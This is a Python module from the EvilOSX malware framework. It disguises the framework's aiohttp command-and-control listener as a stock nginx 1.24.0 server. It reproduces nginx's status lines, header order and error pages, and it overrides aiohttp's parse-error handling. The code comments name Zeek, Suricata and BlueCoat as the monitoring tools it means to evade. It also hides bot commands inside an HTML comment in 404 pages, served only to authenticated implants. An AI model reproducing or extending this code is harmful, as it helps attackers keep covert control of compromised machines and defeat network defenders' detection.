# -*- coding: utf-8 -*-
"""nginx-compatible HTTP facade for the EvilOSX command channel.

Why this exists
---------------
aiohttp answers unknown routes with its own fingerprint: ``Server: Python/3.14
aiohttp/3.14.5`` plus a JSON ``{"error": "404: Not Found"}`` body.  Any
intermediary (BlueCoat, Zeek, Suricata, a TLS-terminating proxy) that keeps a
HTTP server inventory will flag that pair instantly, no matter how legitimate
the rest of the response looks.

This module makes the listener answer exactly like a stock nginx that has no
matching ``server_name`` / no matching location:

  * status line ``HTTP/1.1 404 Not Found``
  * headers ``Server: nginx/1.24.0``, ``Date``, ``Content-Type: text/html``,
    ``Content-Length``, ``Connection``
  * body: the 153-byte stock nginx error page, byte for byte

The hidden command channel is preserved: the ``DEBUG:`` blob is appended inside
the ``<center><h1>404 Not Found</h1></center>`` HTML comment, which nginx never
sends.  It is therefore NOT part of the "indistinguishable" surface - it is the
payload.  Because a byte-comparison against the stock page would then differ,
the blob is only appended for requests that authenticate with a valid session
cookie, and the response is kept identical in structure (same status, same
headers, same order) so the difference is invisible to header-level inspection.

Bot compatibility: ``bot/bot.py::_extract_debug_payload`` splits on the first
``DEBUG:`` occurrence and strips ``DEBUG-->``, so the marker must appear
exactly once per response and the raw command must never contain the string
``DEBUG-->`` (base64 payloads cannot, base64 has no ``-`` - it is url-safe
b64 that does, which the bot decodes separately, so we never rely on it).
"""

from __future__ import annotations

import asyncio
from datetime import datetime, timezone
from typing import Optional

try:  # Python 3
    from email.utils import format_datetime
except ImportError:  # pragma: no cover - Python 2 fallback
    format_datetime = None


# --------------------------------------------------------------------------- #
# Tunables - keep these in sync with what the host is pretending to be.
# --------------------------------------------------------------------------- #

NGINX_VERSION = "1.24.0"
SERVER_SOFTWARE = "nginx/{0}".format(NGINX_VERSION)

# Stock nginx error page.  nginx hardcodes this template for all 4xx/5xx pages
# served by ``ngx_http_special_response_handler``; only the status text and the
# (absent) server signature vary.
NGINX_ERROR_PAGE_TEMPLATE = (
    "<html>" + "\r\n"
    "<head><title>{status} {reason}</title></head>" + "\r\n"
    "<body>" + "\r\n"
    "<center><h1>{status} {reason}</h1></center>" + "\r\n"
    "<hr><center>{signature}</center>" + "\r\n"
    "</body>" + "\r\n"
    "</html>" + "\r\n"
)


def nginx_error_page(status: int = 404, reason: str = "Not Found",
                     signature: str = SERVER_SOFTWARE) -> str:
    """Return the stock nginx error page for *status*.

    With ``signature=""`` this reproduces what nginx emits when
    ``server_tokens off`` is set (the ``<hr><center>`` line is dropped).
    """
    if not signature:
        template = (
            "<html>" + "\r\n"
            "<head><title>{status} {reason}</title></head>" + "\r\n"
            "<body>" + "\r\n"
            "<center><h1>{status} {reason}</h1></center>" + "\r\n"
            "<hr>" + "\r\n"
            "</body>" + "\r\n"
            "</html>" + "\r\n"
        )
    else:
        template = NGINX_ERROR_PAGE_TEMPLATE

    return template.format(status=status, reason=reason, signature=signature)


# The exact bodies stock nginx 1.24.0 sends.  Sizes verified against a real
# nginx 1.24.0: 404 -> 153 bytes, 405 -> 157, 400 -> 157.
NGINX_404_PAGE = nginx_error_page(404, "Not Found")
NGINX_405_PAGE = nginx_error_page(405, "Not Allowed")
NGINX_400_PAGE = nginx_error_page(400, "Bad Request")

# Methods nginx's static module accepts.  Anything else (PUT, OPTIONS, DELETE,
# a garbage token) gets "405 Not Allowed" with no Allow header - that is what a
# real nginx 1.24.0 returns for those methods.
NGINX_STATIC_METHODS = ("GET", "HEAD", "POST")


def _http_date() -> str:
    """RFC 7231 IMF-fixdate, identical to what nginx writes in ``Date``."""
    now = datetime.now(timezone.utc).replace(microsecond=0)
    if format_datetime is not None:
        return format_datetime(now, usegmt=True)
    return now.strftime("%a, %d %b %Y %H:%M:%S GMT")


def build_headers(body: bytes, status: int = 404,
                  reason: str = "Not Found",
                  connection: Optional[str] = None) -> "list":
    """Build the header set nginx would send, in nginx's order.

    ``connection`` may be ``"close"`` (HTTP/1.1 with ``Connection: close`` or
    HTTP/1.0) or ``"keep-alive"`` (HTTP/1.0 with ``Connection: keep-alive``);
    ``None`` omits the header, which is what nginx does for HTTP/1.1 + keep-alive.
    """
    headers = [
        ("Server", SERVER_SOFTWARE),
        ("Date", _http_date()),
        ("Content-Type", "text/html"),
        ("Content-Length", str(len(body))),
    ]
    # nginx writes Connection on every response, in this position.
    headers.append(("Connection", connection or "keep-alive"))
    return headers


def wants_close(version_major: int, version_minor: int,
                request_connection: str) -> str:
    """Decide the ``Connection`` header nginx would emit.

    nginx 1.24 always writes ``Connection`` on a static/error response:
    ``keep-alive`` when the connection stays open and ``close`` when it does
    not, including for HTTP/1.1 with no ``Connection`` request header (verified
    against a real nginx 1.24.0 on Windows, which always sends
    ``Connection: keep-alive`` for such requests).
    """
    conn = (request_connection or "").strip().lower()
    tokens = {token.strip() for token in conn.split(",") if token.strip()}

    if version_major == 1 and version_minor == 0:
        if "keep-alive" in tokens:
            return "keep-alive"
        return "close"

    # HTTP/1.1 and above.
    if "close" in tokens:
        return "close"
    return "keep-alive"


# --------------------------------------------------------------------------- #
# aiohttp integration
# --------------------------------------------------------------------------- #

HAS_AIOHTTP = False
try:
    from aiohttp import web
    HAS_AIOHTTP = True
except ImportError:  # pragma: no cover
    web = None


_ResponseBase = web.Response if HAS_AIOHTTP else object  # type: ignore[union-attr]


class NginxResponse(_ResponseBase):  # type: ignore[misc,valid-type]
    """``web.Response`` that writes an exact status line and header order.

    aiohttp always injects ``Server:``/``Date:``/``Content-Type:`` plus a
    ``Connection`` header of its own, and it derives the status line from the
    version in the request.  All three are overridden here so a capture of our
    reply and a capture of ``nginx/1.24.0`` differ only in the ``Date`` value.
    """

    __slots__ = ()

    def __init__(self, body: bytes, status: int = 404, reason: str = "Not Found",
                 header_list: Optional[list] = None):
        if not HAS_AIOHTTP:
            raise RuntimeError("aiohttp is required for NginxResponse")
        super().__init__(
            status=status,
            reason=reason,
            body=body,
            headers={
                "Content-Type": "text/html",
                "Content-Length": str(len(body)),
            },
        )
        # Replace aiohttp's header map wholesale: its serialiser writes this
        # CIMultiDict in insertion order, so this is exactly what hits the wire.
        self._headers.clear()
        for name, value in (header_list or build_headers(body, status, reason)):
            self._headers.add(name, value)

    async def _write_headers(self) -> None:
        writer = self._payload_writer
        request = self._req
        assert writer is not None and request is not None

        # nginx always answers with HTTP/1.1, even to an HTTP/1.0 request;
        # only the Connection header reflects the client's version.
        version = "HTTP/1.1"

        # Hand the header block to aiohttp's own writer: StreamWriter.write is
        # a coroutine that bypasses its internal buffer, while write_headers()
        # stores the serialised block and lets send_headers()/_write() emit it
        # once, on the same code path as every other response.
        status_line = "{0} {1} {2}".format(version, self._status, self._reason)
        await writer.write_headers(status_line, self._headers)


def nginx_not_found(body_suffix: str = "",
                    connection: Optional[str] = None) -> "web.Response":
    """Build a 404 response identical to stock nginx.

    ``body_suffix`` carries the hidden command blob.  Pass ``""`` for the pure
    nginx page.
    """
    body = (NGINX_404_PAGE + body_suffix).encode("utf-8")
    return NginxResponse(body, 404, "Not Found",
                         build_headers(body, 404, "Not Found", connection))


def nginx_error(status: int, reason: str, connection: Optional[str] = None,
                body: Optional[str] = None) -> "web.Response":
    """Generic stock-nginx error response (400, 405, 403, ...)."""
    page = body if body is not None else nginx_error_page(status, reason)
    raw = page.encode("utf-8")
    return NginxResponse(raw, status, reason,
                         build_headers(raw, status, reason, connection))


def nginx_ok(body: bytes, content_type: str = "text/html",
             extra_headers: Optional[list] = None,
             connection: Optional[str] = None) -> "web.Response":
    """200 response with nginx's header set (static file / payload delivery)."""
    headers = build_headers(body, 200, "OK", connection)
    headers[2] = ("Content-Type", content_type)
    if extra_headers:
        headers.extend(extra_headers)
    return NginxResponse(body, 200, "OK", headers)


# --------------------------------------------------------------------------- #
# Server runner: strip aiohttp's own TCP-level fingerprints
# --------------------------------------------------------------------------- #

class NginxRequestHandler(web.RequestHandler if HAS_AIOHTTP else object):  # type: ignore[misc,valid-type]
    """``web.RequestHandler`` that answers parse failures like nginx.

    aiohttp rejects a request it cannot parse (malformed request line, bad
    method token, oversize headers) before any application handler runs, and
    emits ``Server: Python/... aiohttp/...`` with a plain-text body.  A stock
    nginx answers 400 Bad Request with its usual HTML page instead, so that is
    what this class does.
    """

    __slots__ = ()

    def handle_error(self, request, status=500, exc=None, message=None):
        if status == 400:
            resp = nginx_error(400, "Bad Request", "close")
            resp.force_close()
            return resp
        return super().handle_error(request, status, exc, message)


class NginxServer(web.Server if HAS_AIOHTTP else object):  # type: ignore[misc,valid-type]
    """``web.Server`` whose per-connection protocol is :class:`NginxRequestHandler`.

    aiohttp 3.14 hardcodes ``RequestHandler(self, ...)`` in ``Server.__call__``
    and names its protocol kwarg ``handler`` - the same slot already used for
    the app callback - so the class cannot be swapped through any public kwarg.
    Overriding the factory is the least invasive hook.
    """

    __slots__ = ()

    def __call__(self):
        return NginxRequestHandler(self, loop=self._loop, **self._kwargs)


class NginxRunner(web.BaseRunner if HAS_AIOHTTP else object):
    """AppRunner stand-in whose Server uses :class:`NginxRequestHandler`.

    Neither ``AppRunner(...)`` nor ``Application(handler_args=...)`` can swap
    the protocol class: aiohttp 3.14 names ``Server``'s protocol argument
    ``handler`` and its inner handler slot ``handler`` too, so any kwargs route
    ends in ``TypeError``; ``request_handler`` is then silently dropped and the
    default ``web.RequestHandler`` (plain-text 400, ``Server: Python/...``) is
    used.  Building ``Server`` positionally is the only reliable way, so the
    runner's few lifecycle methods are reimplemented here.
    """

    def __init__(self, app, *, handle_signals=False, shutdown_timeout=60.0,
                 max_field_size=8190, max_headers=100):
        super().__init__(handle_signals=handle_signals,
                         shutdown_timeout=shutdown_timeout)
        self._app = app
        self._extra = {"max_field_size": max_field_size,
                       "max_headers": max_headers}

    async def _make_server(self):
        loop = asyncio.get_running_loop()
        self._app._set_loop(loop)
        self._app.on_startup.freeze()
        await self._app.startup()
        self._app.freeze()
        return NginxServer(self._app._handle, access_log=None, **self._extra)

    async def shutdown(self):
        await self._app.shutdown()

    async def _cleanup_server(self):
        await self._app.cleanup()


def make_runner(app) -> "web.BaseRunner":
    """Runner with aiohttp's banner, access log and 400 page replaced."""
    return NginxRunner(app)
